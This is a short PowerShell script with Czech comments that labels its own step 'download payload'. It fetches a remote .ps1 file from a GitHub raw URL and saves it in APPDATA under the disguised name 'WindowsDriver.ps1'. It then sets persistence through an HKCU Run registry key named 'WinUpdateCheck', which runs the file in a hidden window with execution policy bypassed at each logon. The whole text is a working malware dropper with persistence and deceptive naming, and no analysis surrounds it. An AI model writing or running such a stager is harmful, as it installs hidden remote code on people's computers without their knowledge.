# 1. Stáhni payload
$payloadUrl = "https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1"
$localPath = "$env:APPDATA\WindowsDriver.ps1"
Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath

# 2. Nastav persistenci přes HKCU Run (nevyžaduje admin)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WinUpdateCheck"
$regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""

Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
